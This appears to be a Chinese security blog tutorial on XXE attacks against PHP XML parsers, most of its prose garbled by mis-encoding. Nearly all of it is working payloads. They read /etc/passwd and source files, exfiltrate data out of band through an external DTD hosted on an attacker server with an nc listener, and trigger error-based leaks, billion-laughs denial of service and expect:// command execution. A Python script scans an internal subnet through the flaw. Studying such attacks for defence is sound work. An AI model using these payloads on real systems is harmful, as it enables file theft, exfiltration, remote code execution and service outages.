<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>DOCTYPEå‰è¦ç´§è·Ÿ!</p>
</blockquote>
<p>è€Œé‡Œé¢å¼•ç”¨çš„å¤–éƒ¨å®ä½“evil.dtdçš„å†…å®¹:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file://æ–‡ä»¶è·¯å¾„&quot; &gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h2><p>å‰æï¼š</p>
<p>Content-Type: application&#x2F;xml</p>
<h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><p><code>file_get_contents()</code>:æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p>
<p><code>libxml_disable_entity_loader(false)</code>ï¼šæ„æ€å°±æ˜¯ä¸ç¦æ­¢å¤–éƒ¨å®ä½“åŠ è½½</p>
<p><code>loadXML( string $source, int $options = 0 )</code>: $sourceï¼šæ­¤å‚æ•°ä¿å­˜åŒ…å« XML æ–‡æ¡£çš„å­—ç¬¦ä¸²ã€‚$optionsï¼šæ­¤å‚æ•°ä¿å­˜ libxml é€‰é¡¹å¸¸é‡çš„æŒ‰ä½æˆ–ã€‚è¿”å›å€¼ï¼šæ­¤å‡½æ•°åœ¨æˆåŠŸæ—¶è¿”å› TRUEï¼Œåœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚å¦‚æœé™æ€è°ƒç”¨æ­¤å‡½æ•°ï¼Œåˆ™è¿”å› DOMDocumentï¼Œå¤±è´¥æ—¶è¿”å› FALSEã€‚</p>
<blockquote>
<p>LIBXML_NOENT: å°† XML ä¸­çš„å®ä½“å¼•ç”¨ æ›¿æ¢ æˆå¯¹åº”çš„å€¼</p>
<p>LIBXML_DTDLOAD: åŠ è½½ DOCTYPE ä¸­çš„ DTD æ–‡ä»¶</p>
<h3 id="libxmlé€‰é¡¹å¸¸é‡"><a href="#libxmlé€‰é¡¹å¸¸é‡" class="headerlink" title="libxmlé€‰é¡¹å¸¸é‡"></a>libxmlé€‰é¡¹å¸¸é‡</h3><table>
<thead>
<tr>
<th>åç§°</th>
<th>æè¿°</th>
<th>PHP</th>
</tr>
</thead>
<tbody><tr>
<td>LIBXML_COMPACT</td>
<td>è®¾ç½®å°å‹èŠ‚ç‚¹åˆ†é…ä¼˜åŒ–ã€‚ä¼šæ”¹å–„åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_DTDATTR</td>
<td>è®¾ç½®é»˜è®¤ DTD å±æ€§ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_DTDLOAD</td>
<td>åŠ è½½å¤–éƒ¨å­é›†ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_DTDVALID</td>
<td>é€šè¿‡ DTD è¿›è¡ŒéªŒè¯ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NOBLANKS</td>
<td>åˆ é™¤ç©ºèŠ‚ç‚¹ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NOCDATA</td>
<td>æŠŠ CDATA è®¾ç½®ä¸ºæ–‡æœ¬èŠ‚ç‚¹ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NOEMPTYTAG</td>
<td>æ›´æ”¹ç©ºæ ‡ç­¾ï¼ˆæ¯”å¦‚ <br/> æ”¹ä¸º <br></br>ï¼‰ã€‚ä»…åœ¨ DOMDocument-&gt;save() å’Œ DOMDocument-&gt;saveXML() å‡½æ•°ä¸­å¯ç”¨ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NOENT</td>
<td>æ›¿ä»£å®ä½“ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NOERROR</td>
<td>ä¸æ˜¾ç¤ºé”™è¯¯æŠ¥å‘Šã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NONET</td>
<td>åœ¨åŠ è½½æ–‡æ¡£æ—¶åœæ­¢ç½‘ç»œè®¿é—®ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NOWARNING</td>
<td>ä¸æ˜¾ç¤ºè­¦å‘ŠæŠ¥å‘Šã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NOXMLDECL</td>
<td>åœ¨ä¿å­˜æ–‡æ¡£æ—¶ï¼Œæ’¤é”€ XML å£°æ˜ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_NSCLEAN</td>
<td>åˆ é™¤é¢å¤–çš„å‘½åç©ºé—´å£°æ˜ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_XINCLUDE</td>
<td>ä½¿ç”¨ XInclude ç½®æ¢ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_ERR_ERROR</td>
<td>è·å¾—å¯æ¢å¤çš„é”™è¯¯ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_ERR_FATAL</td>
<td>è·å¾—è‡´å‘½çš„é”™è¯¯ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_ERR_NONE</td>
<td>è·å¾—æ— é”™è¯¯ã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_ERR_WARNING</td>
<td>è·å¾—ç®€å•è­¦å‘Šã€‚</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_VERSION</td>
<td>è·å¾— Libxml ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ï¼š20605 æˆ– 20617ï¼‰Get libxml version (e.g. 20605 or 20617)</td>
<td>5</td>
</tr>
<tr>
<td>LIBXML_DOTTED_VERSION</td>
<td>è·å¾—æœ‰ç‚¹å·çš„ Libxml ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ï¼š2.6.5 æˆ– 2.6.17ï¼‰ã€‚</td>
<td>5</td>
</tr>
</tbody></table>
</blockquote>
<h3 id="åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶"><a href="#åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶"></a>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="phpä¼ªåè®®è¯»å–æºç "><a href="#phpä¼ªåè®®è¯»å–æºç " class="headerlink" title="phpä¼ªåè®®è¯»å–æºç "></a>phpä¼ªåè®®è¯»å–æºç </h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯"><a href="#ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯" class="headerlink" title="ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯"></a>ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯</h3><p>test.xml(é¶åœºéœ€è¦ä¼ è¾“çš„xmlæ–‡ä»¶)</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://é¶æœºip/e.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>e.dtd</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file://è¯»å–æ–‡ä»¶è·¯å¾„&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://é¶æœºIP:ç›‘å¬ç«¯å£/?p=%file;&#x27;&gt;&quot;&gt;  &lt;!--`&amp;#x25;`æ˜¾ç¤ºä¸º`%`--&gt;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨å†…éƒ¨DTDé‡Œï¼Œå‚æ•°å®ä½“å¼•ç”¨åªèƒ½å’Œå…ƒç´ åŒçº§è€Œä¸èƒ½ç›´æ¥å‡ºç°åœ¨å…ƒç´ å£°æ˜å†…éƒ¨ï¼Œå¦åˆ™è§£æå™¨ä¼šæŠ¥é”™<br>åœ¨ å¤–éƒ¨DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“</p>
<ul>
<li><p>%remoteè°ƒç”¨e.dtd  </p>
</li>
<li><p>%intåŠ è½½äº†fileï¼Œ%fileè·å–äº†flagæ–‡ä»¶å†…å®¹</p>
</li>
<li><p>%sendå°†æ•°æ®å‘é€åˆ°é¶æœºä¸Š</p>
</li>
</ul>
<p>%ä¸å…è®¸å‡ºç°åœ¨ Entityçš„valueä¸­ï¼Œæ‰€ä»¥éœ€è¦å°†%è¿›è¡ŒUnicodeç¼–ç ä¸º % æˆ–è€… %(è½¬åŒ–æˆUnicodeç¼–ç æœ‰ä¸¤ç§å½¢å¼ï¼Œä»¥&amp;#åæ¥åè¿›åˆ¶æ•°å­—ï¼Œ&amp;#xåæ¥åå…­è¿›åˆ¶æ•°å­—)</p>
<p>ä½¿ç”¨æœ¬åœ°php_xxeé¶åœº,å‘é€ä»¥ä¸‹</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://124.223.207.184/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>æ“ä½œè¿‡ç¨‹ï¼š</p>
<ul>
<li><p>åœ¨è‡ªå·±çš„vpsæˆ–äº‘æœåŠ¡å™¨ä¸Šå…ˆæ­å»ºç«™ç‚¹ï¼ˆä½¿ç”¨å®å¡”é¢æ¿æ­å»ºphpç«™ç‚¹ï¼Œç«¯å£ä»»æ„ï¼Œå¯ä»¥æ˜¯é»˜è®¤80,åŸŸåå†™:å…¬ç½‘ip:ç«¯å£ï¼‰</p>
</li>
<li><p>ç™»å½•äº‘æœåŠ¡å™¨ è…¾è®¯äº‘ä¸‹ç›®å½•ä¸º &#x2F;www&#x2F;wwwroot&#x2F;å…¬ç½‘ip åœ¨é‡Œé¢vimä¸€ä¸ªe.dtdï¼Œè¾“å…¥ä¸Šè¿°payload</p>
</li>
<li><p>æ³¨æ„é€‰æ‹©ç›‘å¬ç«¯å£ï¼Œé€‰æ‹©æ¯”è¾ƒåçš„ï¼Œæ²¡æœ‰æœåŠ¡è¿è¡Œçš„ï¼Œæ¯”å¦‚2333ï¼Œç„¶åè¦åœ¨äº‘æœåŠ¡å™¨æ§åˆ¶å°å’Œå®å¡”éƒ½æ”¾è¡Œè¯¥ç«¯å£ï¼Œé˜²ç«å¢™å¯å…³å¯ä¸å…³</p>
</li>
<li><p>äº‘æœåŠ¡å™¨æ‰§è¡Œç›‘å¬2333ç«¯å£:<code>nc -lvvp 2333</code></p>
</li>
<li><p>æœ¬æœºé¶åœºä¸Šå‘é€æ„é€ çš„xmlæ–‡ä»¶ï¼Œäº‘æœåŠ¡å™¨ç«¯ä¼šå›æ˜¾fileå‚æ•°å®ä½“å†…å®¹ï¼Œå³<code>php://filter/read=convert.base64-encode/resource=file://è¯»å–æ–‡ä»¶è·¯å¾„</code></p>
<p>âš ï¸è¸©è¿‡çš„å‘ï¼šåœ¨æ—¥å¿—ä¸­æŸ¥çœ‹å›æ˜¾ï¼ŒæœåŠ¡å™¨æ—¥å¿—(80ç«¯å£)ï¼Œä½†æºå¸¦flagçš„httpè¯·æ±‚æ˜¯è®¿é—®3344ç«¯å£çš„</p>
</li>
</ul>
</blockquote>
<h3 id="æŠ¥é”™è¾“å‡º"><a href="#æŠ¥é”™è¾“å‡º" class="headerlink" title="æŠ¥é”™è¾“å‡º"></a>æŠ¥é”™è¾“å‡º</h3><p>ç¯å¢ƒï¼š</p>
<ul>
<li>libxml&lt;&#x3D;2.8(2.9ä»¥åé»˜è®¤ä¸ä½¿ç”¨å¤–éƒ¨å®ä½“)</li>
<li>å¼€å¯äº†æŠ¥é”™</li>
<li>æ— å›æ˜¾</li>
</ul>
<p>payload1</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % a &#x27;</span><br><span class="line">		&lt;!ENTITY &amp;#x25; b &quot;</span><br><span class="line">			&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span><br><span class="line">			&gt;</span><br><span class="line">		&quot;&gt;</span><br><span class="line">	&#x27;&gt;</span><br><span class="line">%a;</span><br><span class="line">%b;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;asfddasfd&lt;/message&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>nonexistentå¯æ›¿æ¢æˆä»»æ„æ ¹ç›®å½•ä¸‹ä¸å­˜åœ¨çš„æ–‡ä»¶å¤¹åç§°ï¼Œè¿™ä¹Ÿæ˜¯æŠ¥é”™çš„åŸå› ï¼šè¯»å–äº†ä¸å­˜åœ¨æ–‡ä»¶</p>
<p>fileå‚æ•°å®ä½“å†…å®¹å³ä¸ºæƒ³è¯»å–çš„æ–‡ä»¶å†…å®¹</p>
<p><code>&amp;#x27;</code> : <code>&#39;</code></p>
<p><code>&amp;#x25;</code> :<code>%</code></p>
<p><code>&amp;#x26;</code> :<code>&amp;</code></p>
</blockquote>
<p>payload2</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % condition &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">    %condition;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;any text&lt;/message&gt;</span><br></pre></td></tr></table></figure></div>


<h3 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a><strong>DDos</strong></h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;abc&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¯¥æ”»å‡»é€šè¿‡åˆ›å»ºä¸€é¡¹é€’å½’çš„ XML å®šä¹‰ï¼Œåœ¨å†…å­˜ä¸­ç”Ÿæˆåäº¿ä¸ªâ€abcâ€å­—ç¬¦ä¸²ï¼Œä»è€Œå¯¼è‡´ DDoS æ”»å‡»ã€‚åŸç†ä¸ºï¼šæ„é€ æ¶æ„çš„XMLå®ä½“æ–‡ä»¶è€—å°½å¯ç”¨å†…å­˜ï¼Œå› ä¸ºè®¸å¤šXMLè§£æå™¨åœ¨è§£æXMLæ–‡æ¡£æ—¶å€¾å‘äºå°†å®ƒçš„æ•´ä¸ªç»“æ„ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè§£æéå¸¸æ…¢ï¼Œé€ æˆäº†æ‹’ç»æœåŠ¡å™¨æ”»å‡»ã€‚</p>
<h4 id="PHP-expect-RCE"><a href="#PHP-expect-RCE" class="headerlink" title=".PHP expect RCE"></a><strong>.PHP expect RCE</strong></h4><p>ç”±äº PHP çš„ expect å¹¶ä¸æ˜¯é»˜è®¤å®‰è£…æ‰©å±•ï¼Œå¦‚æœå®‰è£…äº†è¿™ä¸ªexpect æ‰©å±•æˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨ XXE è¿›è¡Œ RCE</p>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;/file&gt;</span><br><span class="line">&lt;/dir&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="HTTP-å†…ç½‘ä¸»æœºæ¢æµ‹"><a href="#HTTP-å†…ç½‘ä¸»æœºæ¢æµ‹" class="headerlink" title="HTTP å†…ç½‘ä¸»æœºæ¢æµ‹"></a><strong>HTTP å†…ç½‘ä¸»æœºæ¢æµ‹</strong></h3><p>æ¢æµ‹è„šæœ¬</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_xml</span>(<span class="params">string</span>):</span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_xml</span>(<span class="params">xml</span>):</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://é¶æœºip/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="built_in">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = <span class="built_in">str</span>(i)</span><br><span class="line">        ip = <span class="string">&#x27;10.0.0.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
